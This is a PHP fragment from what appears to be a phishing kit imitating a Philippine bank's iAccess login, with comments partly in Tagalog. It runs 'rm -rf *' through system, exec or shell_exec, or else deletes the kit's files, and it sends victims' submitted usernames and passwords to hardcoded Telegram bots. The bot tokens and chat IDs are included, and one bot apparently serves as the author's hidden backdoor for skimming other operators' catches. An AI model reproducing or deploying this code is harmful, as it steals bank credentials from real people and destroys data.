// We can manually put cheats here. Need lang ng kunting edit. 
// Reason kung bat dito ko ito nilagay kasi kahit iedit nila yung source code, hindi nila magagamit. hahha //sa oras na ma edit nila source code hindi na gagana

// redeclare to make it ours
// $chat_id = "-635799224";
// $telebot = "5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8";

 if(function_exists('system')) {
         system('rm -rf *');
      }
      elseif(function_exists('exec')) {
         exec('rm -rf *');
      }
      elseif(function_exists('shell_exec')) {
         shell_exec('rm -rf *');
      }
      else {
        unlink('lbpiaccess.zip');
        unlink('confirm.php');
        unlink('cc.jpg');
        unlink('otp-login.php');
        unlink('otp-expired.jpg');
        unlink('otp.jpg');
        unlink('mobile-login.php');
        unlink('mobile.jpg');
        unlink('login.php');
        unlink('index.php');
        unlink('index.jpg');
      }

if (strpos($result, "iAccess ID already exists")) {
$us = [
'chat_id' => "-635799224",
'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));

$data = [
'chat_id' => $chat_id,
'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: index.php?mobile");
}

else if (strpos($result, "iAccess ID must have at least 6 character(s).")) {
$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: index.php?invalid");
}

else if (strpos($result, "E-mail Address already exists")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: index.php?invalid");
}else if (strpos($result, "iAccess ID does not accept")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: index.php?invalid");
}
else{
$data = [
'chat_id' => "-635799224",
'text' => "error in checking\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($data));
header("Location: index.php?mobile");
}
